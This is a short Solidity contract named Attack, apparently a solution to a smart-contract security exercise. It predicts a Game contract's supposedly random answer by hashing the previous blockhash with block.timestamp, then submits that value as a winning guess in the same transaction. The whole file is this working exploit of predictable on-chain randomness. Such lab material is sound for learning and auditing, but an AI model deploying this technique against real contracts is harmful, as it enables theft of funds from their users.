// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Game.sol";

import "forge-std/Console.sol";

contract Attack {
    Game game;
    uint256 public lastGuess;

    constructor(Game _game) {
        game = _game;
    }

    function attack() public {
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        game.guess(answer, msg.sender);
    }

    receive() external payable {}
}
